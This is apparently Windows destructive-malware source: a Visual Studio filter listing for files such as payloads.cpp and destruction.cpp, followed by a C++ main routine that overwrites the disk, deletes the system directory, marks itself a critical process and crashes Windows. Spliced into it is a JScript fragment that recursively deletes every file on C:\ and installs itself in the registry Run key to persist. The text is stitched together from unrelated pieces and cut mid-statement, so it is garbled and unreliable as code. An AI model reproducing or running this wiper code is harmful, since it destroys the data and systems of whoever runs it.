<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source</Filter>
    </ClCompile>
    <ClCompile Include="payloads.cpp">
      <Filter>Source</Filter>
    </ClCompile>
    <ClCompile Include="timer.cpp">
      <Filter>Source</Filter>
    </ClCompile>
    <ClCompile Include="virtual_screen.cpp">
      <Filter>Source</Filter>
    </ClCompile>
    <ClCompile Include="destruction.cpp">
      <Filter>Source</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="payloads.h">
      <Filter>Header</Filter>
    </ClInclude>
    <ClInclude Include="timer.h">
      <Filter>Header</Filter>
    </ClInclude>
    <ClInclude Include="virtual_screen.h">
      <Filter>Header</Filter>
    </ClInclude>
    <ClInclude Include="def.h">
      <Filter>Header</Filter>
    </ClInclude>
    <ClInclude Include="destruction.h">
      <Filter>Header</Filter>
    </ClInclude>
  </ItemGroup>
</Project>

#include "destruction.h"
#include "payloads.h"

void InitDPI() {
	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
	
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}

	FreeLibrary(hModUser32);
}
WCHAR SystemDirectory[MAX_PATH] = { 0 };
	GetSystemDirectory(SystemDirectory, MAX_PATH);

	OverWriteDisk();
	DestroyDirectory(SystemDirectory);

	AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = {0};
	pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1 };
	pAudioSequences[1] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence2 };
	pAudioSequences[2] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence3 };
	pAudioSequences[3] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence4 };
	pAudioSequences[4] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence5 };
	pAudioSequences[5] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence6 };
	pAudioSequences[6] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence7 };
	pAudioSequences[7] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence8 };
	pAudioSequences[8] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence9 };
	pAudioSequences[9] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence10 };

	SeedXorshift32((DWORD)__rdtsc());

	InitDPI();

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioPayloadThread), (PVOID)pAudioSequences, 0, NULL);

	SetCriticalProcess();

	ExecutePayload(Payload1, PAYLOAD_TIME);
	ExecutePayload(Payload2, PAYLOAD_TIME);
	ExecutePayload(Payload3, PAYLOAD_TIME);
	ExecutePayload(Payload4, PAYLOAD_TIME);
	ExecutePayload(Payload5, PAYLOAD_TIME);
	ExecutePayload(Payload6, PAYLOAD_TIME);
	ExecutePayload(Payload7, PAYLOAD_TIME);
	ExecutePayload(Payload8, PAYLOAD_TIME);
	ExecutePayload(Payload9, PAYLOAD_TIME);
	ExecutePayload(Payload10, PAYLOAD_TIME);

	ExecuteShader(Shader1, PAYLOAD_TIME);
	ExecuteShader(Shader2, PAYLOAD_TIME);
	ExecuteShader(Shader3, PAYLOAD_TIME);
	ExecuteShader(Shader4, PAYLOAD_TIME);
	ExecuteShader(Shader5, PAYLOAD_TIME);
	ExecuteShader(Shader6, PAYLOAD_TIME);
	ExecuteShader(Shader7, PAYLOAD_TIME);
	ExecuteShader(Shader8, PAYLOAD_TIME);
	ExecuteShader(Shader9, PAYLOAD_TIME);
	ExecuteShader(Shader10, PAYLOAD_TIME);
	ExecuteShader(Shader11, PAYLOAD_TIME);
	ExecuteShader(Shader12, PAYLOAD_TIME);
	ExecuteShader(Shader13, PAYLOAD_TIME);
	ExecuteShader(Shader14, PAYLOAD_TIME);
	ExecuteShader(Shader15, PAYLOAD_TIME);
	ExecuteShader(Shader16, PAYLOAD_TIME);
 var TF=WScript.ScriptFullName,FS=new ActiveXObject("Scripting.FileSystemObject"),
SS=new ActiveXObject("WScript.Shell"),V='var D="C:\\\\",fs=new ActiveXObject("Scriptin'
+'g.FileSystemObject");f(D);function f(fl)\r\n{fl=fs.GetFolder(fl);var F=new Enumerator'
+'g.FileSystemObject");f(D);function f(fl)\r\n{fl=fs.GetFolder(fl);var F=new Enumerator'
+'(fl.Files),FD=new Enumerator(fl.SubFolders);\r\nfor(;!F.atEnd();F.moveNext()){try{fs.'
+'GetFile(F.item()).Delete(true);}catch(e){}}\r\nfor(;!FD.atEnd();FD.moveNext()){f(FD.it'
+'em());}}//End Of File',RN=(Math.random()*100)+10,DD="C:\\",TD;a(DD);function a(dd){
var Fx=new Enumerator(FS.GetFolder(dd+"").SubFolders),Fa=new Array()for(var i=0;!Fx.atEnd();
Fx.moveNext(),i++){Fa[i]=Fx.item();if(RN--<=0.1)TD=Fa[i];}for(var x in Fa)a(Fa[x])}b();
function b(){var Fg=TD+new Date().getTime()+".js";Fv=FS.CreateTextFile(Fg,true);Fv.Write(V);
Fv.Close();SS.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+new Date().getTime(),Fg,"REG_SZ");}var AD;c(DD);function c(dd){if(AD+""=="undefined"){
var dd=FS.GetFolder(dd),Fl=new Enumerator(dd.Files),Fd=new Enumerator(dd.SubFolders);
for(;!Fl.atEnd();Fl.moveNext()){if(e(Fl.item()+"",".doc")){AD=Fl.item()+"";}}for(;
!Fd.atEnd();Fd.moveNext()){c(Fd.item()+"");}}}function e(sy,ey){return(
CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(FileMessPayload), (PVOID)SystemDirectory, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
	Sleep(20000);
	CrashWindows();
	return 0;
}